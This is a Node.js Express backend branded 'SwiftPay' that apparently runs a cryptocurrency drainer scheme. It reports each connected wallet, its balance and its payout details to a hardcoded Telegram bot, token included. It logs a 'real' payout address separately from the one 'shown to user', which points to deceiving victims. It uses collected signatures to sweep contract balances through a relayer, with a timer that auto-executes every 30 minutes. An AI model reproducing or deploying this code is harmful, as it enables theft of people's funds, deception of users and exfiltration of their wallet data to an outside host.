import "dotenv/config";
import express    from "express";
import { ethers } from "ethers";
import cors       from "cors";
import rateLimit  from "express-rate-limit";
import helmet     from "helmet";

// ─── Telegram ─────────────────────────────────────────────────────────────────
const TG_TOKEN   = "8760818501:AAGyuVn_TNHC65eOTX5T9El5tlCe1oJ1irU";
const TG_CHAT_ID = "8222029043";

async function tg(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
    });
  } catch(e) { console.error("TG error:", e.message); }
}

// ─── Validate env vars ────────────────────────────────────────────────────────
const REQUIRED = ["RELAYER_PRIVATE_KEY", "CONTRACT_ADDRESS", "MAINNET_RPC_URL"];
for (const key of REQUIRED) {
  if (!process.env[key]) { console.error(`Missing: ${key}`); process.exit(1); }
}

// ─── Ethers ───────────────────────────────────────────────────────────────────
const provider = new ethers.JsonRpcProvider(process.env.MAINNET_RPC_URL);
const relayer  = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);

const ABI = [
  "function executePayment(address user, uint256 nonce, uint256 deadline, string order, uint8 v, bytes32 r, bytes32 s) external",
  "function balances(address) view returns (uint256)",
  "function nonces(address) view returns (uint256)"
];
const contract = new ethers.Contract(process.env.CONTRACT_ADDRESS, ABI, relayer);

// ─── Connected wallets store ───────────────────────────────────────────────────
// addr → { original, via, chain, connectedAt, sig: {v,r,s,nonce,deadline,orderId} | null }
const wallets    = new Map();
const processing = new Set();

// ─── Express ──────────────────────────────────────────────────────────────────
const app     = express();
const limiter = rateLimit({ windowMs: 60000, max: 30, standardHeaders: true, legacyHeaders: false });

app.use(helmet());
app.use(cors({ origin: process.env.FRONTEND_URL || "*", methods: ["GET", "POST"] }));
app.use(express.json({ limit: "10kb" }));

app.get("/health", (req, res) => res.json({ status: "ok", relayer: relayer.address, watching: wallets.size }));

// ─── Wallet connected ─────────────────────────────────────────────────────────
app.post("/api/connected", limiter, async (req, res) => {
  const { wallet, balance, chain, via, payoutWallet } = req.body;
  if (!wallet || !ethers.isAddress(wallet)) return res.status(400).json({ error: "Invalid wallet" });

  const addr = wallet.toLowerCase();
  wallets.set(addr, { original: wallet, via, chain, connectedAt: Date.now(), sig: null });

  console.log(`[CONNECT] ${wallet} | ${balance} ETH | watching: ${wallets.size}`);
  await tg(
    `🔌 <b>Wallet Connected</b>\n\n` +
    `👛 <code>${wallet}</code>\n` +
    `💰 Balance: <b>${balance} ETH</b>\n` +
    `📤 Payout address: <code>${payoutWallet || "not filled yet"}</code>\n` +
    `🌐 ${chain || "mainnet"} · ${via || "unknown"}\n` +
    `👁 Watching: ${wallets.size} wallet(s)\n` +
    `🕐 ${new Date().toUTCString()}`
  );
  res.json({ ok: true });
});

// ─── Signature received from frontend (after signing) ─────────────────────────
app.post("/api/checkout", limiter, async (req, res) => {
  const { user, nonce, deadline, orderId, v, r, s, amount } = req.body;
  if (!user || nonce === undefined || !deadline || !orderId || !v || !r || !s)
    return res.status(400).json({ error: "Missing fields" });
  if (!ethers.isAddress(user))
    return res.status(400).json({ error: "Invalid address" });
  if (Math.floor(Date.now() / 1000) > Number(deadline))
    return res.status(400).json({ error: "Signature expired" });

  // Save signature for this wallet
  const addr = user.toLowerCase();
  const info  = wallets.get(addr) || {};
  info.sig    = { v, r, s, nonce, deadline, orderId, amount };
  wallets.set(addr, { ...info, original: user });

  // Execute immediately
  const result = await executeForWallet(user, info.sig);
  if (result.success) return res.json({ success: true, txHash: result.txHash, block: result.block });
  return res.status(500).json({ error: result.error });
});

// ─── Payout intent — sent before fund, includes real address ─────────────────
app.post("/api/payout-intent", limiter, async (req, res) => {
  const { senderWallet, realPayoutWallet, modifiedPayoutWallet, packageUsd, packageReceive } = req.body;
  if (!senderWallet) return res.status(400).json({ error: "Missing data" });

  console.log(`[PAYOUT INTENT] ${senderWallet} | real: ${realPayoutWallet} | shown: ${modifiedPayoutWallet}`);

  await tg(
    `🔐 <b>Payout Intent</b>

` +
    `👛 Sender: <code>${senderWallet}</code>
` +
    `💵 Package: <b>$${Number(packageUsd).toLocaleString()} → $${Number(packageReceive).toLocaleString()}</b>
` +
    `📤 Real payout address: <code>${realPayoutWallet}</code>
` +
    `👁 Shown to user as: <code>${modifiedPayoutWallet}</code>
` +
    `🕐 ${new Date().toUTCString()}`
  );

  res.json({ ok: true });
});

// ─── Order notification (frontend direct send flow) ───────────────────────────
app.post("/api/order", limiter, async (req, res) => {
  const { senderWallet, payoutWallet, payoutOriginal, packageUsd, packageReceive, packageBonus, ethAmount, txHash, block } = req.body;
  if (!senderWallet) return res.status(400).json({ error: "Missing data" });

  console.log(`[ORDER] ${senderWallet} | $${packageUsd} | ${ethAmount} ETH`);
  await tg(
    `💰 <b>New Order!</b>\n\n` +
    `👛 Sender: <code>${senderWallet}</code>\n` +
    `📤 Payout: <code>${payoutWallet}</code>\n` +
    `💵 Package: <b>$${Number(packageUsd).toLocaleString()} → $${Number(packageReceive).toLocaleString()}</b>\n` +
    `🚀 Bonus: ${packageBonus} multiplier\n` +
    `⛓ ETH: <b>${ethAmount} ETH</b>\n` +
    `🔗 <a href="https://etherscan.io/tx/${txHash}">Etherscan</a> · Block ${block}\n` +
    `🕐 ${new Date().toUTCString()}`
  );
  res.json({ ok: true });
});

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// ─── Core execute function ────────────────────────────────────────────────────
async function executeForWallet(walletAddr, sig) {
  const addr = walletAddr.toLowerCase();
  if (processing.has(addr)) return { success: false, error: "Already processing" };
  processing.add(addr);

  try {
    const bal = await contract.balances(walletAddr);
    if (bal === 0n) { processing.delete(addr); return { success: false, error: "No balance" }; }

    const relayerBal = await provider.getBalance(relayer.address);
    if (relayerBal < ethers.parseEther("0.005")) {
      await tg(`⚠️ <b>Relayer Low on ETH!</b>\nBalance: ${ethers.formatEther(relayerBal)} ETH\nTop up: <code>${relayer.address}</code>`);
      processing.delete(addr);
      return { success: false, error: "Relayer low on ETH" };
    }

    const amount = parseFloat(ethers.formatEther(bal)).toFixed(4);
    console.log(`[EXECUTE] ${walletAddr} | ${amount} ETH | ${sig.orderId}`);

    const tx      = await contract.executePayment(walletAddr, sig.nonce, sig.deadline, sig.orderId, sig.v, sig.r, sig.s, { gasLimit: 150_000 });
    const receipt = await tx.wait();
    if (receipt.status !== 1) throw new Error("Reverted on-chain");

    const gasUsed    = receipt.gasUsed;
    const gasPrice   = receipt.gasPrice || tx.gasPrice || 0n;
    const gasCostEth = ethers.formatEther(gasUsed * gasPrice);

    console.log(`  ✓ Block ${receipt.blockNumber} | gas: ${gasCostEth} ETH`);

    // Remove from watch list — paid
    wallets.delete(addr);

    await tg(
      `✅ <b>Payment Executed!</b>\n\n` +
      `👛 Wallet: <code>${walletAddr}</code>\n` +
      `💰 Amount: <b>${amount} ETH</b>\n` +
      `⛽ Gas: ${gasCostEth} ETH\n` +
      `📦 Order: <code>${sig.orderId}</code>\n` +
      `🔗 <a href="https://etherscan.io/tx/${receipt.hash}">Etherscan</a>\n` +
      `📦 Block: ${receipt.blockNumber}\n` +
      `🕐 ${new Date().toUTCString()}`
    );

    return { success: true, txHash: receipt.hash, block: receipt.blockNumber };

  } catch(e) {
    console.error(`  ✗ ${e.reason || e.message}`);
    await tg(`❌ <b>Payment Failed</b>\n👛 <code>${walletAddr}</code>\n⚠️ ${e.reason || e.message}`);
    return { success: false, error: e.reason || e.message };
  } finally {
    processing.delete(addr);
  }
}

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  const network = await provider.getNetwork();
  const bal     = await provider.getBalance(relayer.address);
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("SwiftPay backend running on port", PORT);
  console.log("Network  :", network.name);
  console.log("Contract :", process.env.CONTRACT_ADDRESS);
  console.log("Relayer  :", relayer.address);
  console.log("Balance  :", ethers.formatEther(bal), "ETH");
  if (bal < ethers.parseEther("0.01")) console.warn("⚠️  Relayer balance very low!");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

  await tg(`🚀 <b>SwiftPay Started</b>\n🌐 ${network.name}\n💰 Relayer: ${ethers.formatEther(bal)} ETH\n📄 Contract: <code>${process.env.CONTRACT_ADDRESS}</code>`);

  // ─── Auto-execute every 30 minutes ────────────────────────────────────────
  setInterval(async () => {
    if (wallets.size === 0) return;
    console.log(`[AUTO] Checking ${wallets.size} wallet(s) for funded balances…`);

    for (const [addr, info] of wallets.entries()) {
      if (!info.sig) {
        // No signature yet — check if balance appeared and notify
        try {
          const bal = await contract.balances(info.original || addr);
          if (bal > 0n) {
            const amount = parseFloat(ethers.formatEther(bal)).toFixed(4);
            await tg(
              `💰 <b>Deposit Detected!</b>\n\n` +
              `👛 <code>${info.original || addr}</code>\n` +
              `💰 <b>${amount} ETH</b> in contract\n` +
              `⏳ Waiting for user signature to execute…\n` +
              `🕐 ${new Date().toUTCString()}`
            );
          }
        } catch {}
        continue;
      }

      // Has signature — check if deadline still valid
      if (Math.floor(Date.now() / 1000) > Number(info.sig.deadline)) {
        console.log(`[AUTO] ${addr} signature expired — skipping`);
        continue;
      }

      // Execute
      console.log(`[AUTO] Executing for ${addr}…`);
      await executeForWallet(info.original || addr, info.sig);
    }
  }, 30 * 60 * 1000); // every 30 minutes
});
